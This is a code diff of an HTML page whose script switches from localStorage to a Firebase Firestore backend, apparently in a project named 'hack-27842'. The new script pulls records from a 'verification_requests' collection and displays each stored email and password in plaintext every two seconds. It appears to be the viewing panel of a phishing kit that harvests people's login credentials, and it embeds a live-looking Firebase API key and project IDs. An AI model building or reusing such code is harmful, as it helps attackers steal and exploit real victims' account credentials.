@@ -41,26 +41,48 @@
         <div id="message" class="message"></div>
     </div>
 
-    <script>
-        function displayInfo() {
-            // Retrieve data from localStorage
-            const submissionData = JSON.parse(localStorage.getItem('submissionData')) || [];
+    <!-- Firebase App (the core Firebase SDK) -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js';
+        import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js';
 
-            // Display the information
-            const infoDiv = document.getElementById('info');
-            if (submissionData.length > 0) {
-                infoDiv.innerHTML = submissionData.map(item => 
-                    `<p>Email: ${item.email}<br>Password: ${item.password}</p>`
-                ).join('<hr>');
-            } else {
-                infoDiv.innerHTML = '<p>No information available.</p>';
+        const firebaseConfig = {
+            apiKey: "AIzaSyBHquXAfwBPnFpGQ7No-kC17O25PRsceHY",
+            authDomain: "hack-27842.firebaseapp.com",
+            projectId: "hack-27842",
+            storageBucket: "hack-27842.appspot.com",
+            messagingSenderId: "606359984765",
+            appId: "1:606359984765:web:a5df7d7ed3e70432deaf14"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const infoDiv = document.getElementById('info');
+
+        async function displayInfo() {
+            try {
+                const querySnapshot = await getDocs(collection(db, 'verification_requests'));
+                if (querySnapshot.empty) {
+                    infoDiv.innerHTML = '<p>No information available.</p>';
+                    return;
+                }
+                let content = '';
+                querySnapshot.forEach(doc => {
+                    const data = doc.data();
+                    content += `<p>Email: ${data.email}<br>Password: ${data.password}</p><hr>`;
+                });
+                infoDiv.innerHTML = content;
+            } catch (error) {
+                console.error('Error fetching data:', error);
+                infoDiv.innerHTML = '<p>Error fetching data.</p>';
             }
         }
 
         // Display information immediately
         displayInfo();
 
-        // Update information every 2 seconds
+        // Optionally update information every 2 seconds
         setInterval(displayInfo, 2000);
     </script>
 </body>
